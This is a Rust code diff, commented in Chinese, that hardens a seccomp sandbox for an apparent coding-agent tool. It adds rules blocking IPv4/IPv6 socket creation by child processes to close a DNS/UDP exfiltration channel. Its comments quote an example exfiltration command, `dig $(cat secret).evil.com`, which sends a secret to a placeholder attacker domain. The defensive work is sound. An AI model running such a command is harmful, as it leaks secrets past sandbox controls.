@@ -11,11 +11,12 @@
 //!
 //! ## UDP/DNS 边界
 //!
-//! 本过滤器**不**封堵网络类 syscall（socket/connect/sendto 等保持放行）——
-//! landlock ABI4 已拒绝子进程 TCP bind/connect；UDP/DNS 残留通道由
-//! web 工具的 DNS 解析-连接 IP pinning（A2，`minicoding-tools::web`）在应用层
-//! 另行处理，seccomp 层不做重复且更粗糙的拦截。
-//!
+//! landlock ABI4 网络原语仅覆盖 TCP（bind/connect），UDP/DNS/ICMP 残留外泄
+//! 通道（如 `dig $(cat secret).evil.com`）由本过滤器的**参数化规则**封堵：
+//! `socket(AF_INET)`/`socket(AF_INET6)` 拒绝（SEC-8，2026-08-28 R5 收尾）。
+//! `AF_UNIX` 不受影响（沙箱内本地 IPC 是合法需求）。web 工具在主进程内执行
+//! 不经 seccomp（沙箱只作用于 spawn 的子进程），其 DNS 解析-连接 IP pinning
+//! （A2，`minicoding-tools::web`）在应用层另行处理。
 //! ## 与 pre_exec 的协作方式
 //!
 //! libseccomp 的 filter 构建（`new`/`add_arch`/`add_rule`）与加载（`load`）
@@ -136,6 +137,31 @@ pub(crate) fn prepare_deny_filter() -> Result<PreparedFilter, SandboxError> {
                 tracing::debug!(syscall = name, "seccomp: 当前内核不支持该 syscall，跳过");
             }
         }
+    }
+
+    // SEC-8（2026-08-28 R5 收尾）：UDP/DNS 外泄通道封堵——landlock ABI4 网络
+    // 原语仅覆盖 TCP，沙箱子进程仍可用 `dig $(cat secret).evil.com` 或任意
+    // UDP 报文对外通信（security.md 曾误称"默认禁 TCP/UDP"）。此处用 seccomp
+    // **参数过滤**封堵 socket 创建：仅拒绝 `socket(AF_INET/AF_INET6, ...)`，
+    // 不误伤 AF_UNIX（本地 IPC 是沙箱内合法需求，SSH/容器 agent 依赖）。规则
+    // 追加在 `socket` 的 deny 之后（libseccomp 多规则同 syscall 取并集），
+    // AF_INET=2、AF_INET6=10。默认 action=Allow，未匹配的 socket 域仍放行
+    // （如 AF_UNIX）。
+    if let Ok(socket_syscall) = ScmpSyscall::from_name("socket") {
+        use libseccomp::{ScmpArgCompare, ScmpCompareOp};
+        for af in [2u64, 10u64] {
+            ctx.add_rule_conditional(
+                ScmpAction::Errno(libc::EPERM),
+                socket_syscall,
+                &[ScmpArgCompare::new(0, ScmpCompareOp::Equal, af)],
+            )
+            .map_err(|e| {
+                SandboxError::Sandbox(format!("seccomp add_rule socket(AF_INET{af}): {e}"))
+            })?;
+        }
+        applied.push("socket(AF_INET/AF_INET6)");
+    } else {
+        tracing::debug!("seccomp: 当前内核不支持 socket syscall，跳过");
     }
     tracing::info!(
         applied = applied.len(),
